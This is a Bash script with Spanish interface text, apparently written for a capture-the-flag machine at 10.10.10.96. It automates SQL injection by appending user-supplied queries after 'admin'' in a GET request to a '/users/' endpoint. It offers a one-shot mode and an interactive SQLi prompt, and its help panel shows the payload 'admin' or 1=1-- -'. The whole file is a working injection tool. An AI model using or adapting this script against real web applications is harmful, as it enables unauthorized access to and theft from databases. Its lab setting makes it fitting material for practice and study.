#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# ctrl + c
function ctrl_c(){
  echo -e "\n\n${redColour}[+]${endColour} ${grayColour}Saliendo...${endColour}\n"
  exit 1
}
trap ctrl_c INT

# Funciones
function sqli(){

  query="$1"
  query_urlencode="$(echo $query | sed 's/ /%20/g')"
  echo; curl -s -X GET """http://10.10.10.96/users/admin'$query_urlencode""" | awk -F ":" '{print $2}' | tr -d '"' | tr -d "}"
}

function interactiveMode(){

  while [ "$myQuery" != "exit" ]; do
    echo -ne "\n${grayColour}S${endColour}${redColour}Q${endColour}${purpleColour}L${endColour}${yellowColour}i${endColor}${greenColour}> ${endColour}" && read myQuery
    query_urlencode="$(echo $myQuery | sed 's/ /%20/g')"
    echo;curl -s -X GET """http://10.10.10.96/users/admin'$query_urlencode""" | awk -F ":" '{print $2}' | tr -d '"' | tr -d "}"
  done

}
  
function helpPanel(){

  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Modo de uso: ${endColour}\n"
  echo -e "\t${purpleColour}q)${endColour} ${grayColour}Query a realizar:${endColour} ${blueColour}[${endColour}${greenColour}admin' or 1=1-- -${endColour}${blueColour}]${endColour}"
  echo -e "\t${purpleColour}i)${endColour} ${grayColour}Modo interactivo${endColour}"
  echo -e "\t${purpleColour}h)${endColour} ${grayColour}Panel de ayuda${endColour}\n"
}

declare -i parameter_counter=0

while getopts "q:hi" arg; do
  case $arg in
    q) query="$OPTARG"; let parameter_counter+=1;;
    i) myQuery="$OPTARG"; let parameter_counter+=2;;
    h) helpPanel;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  sqli "$query"

elif [ $parameter_counter -eq 2 ]; then
  interactiveMode 
else
  helpPanel
fi
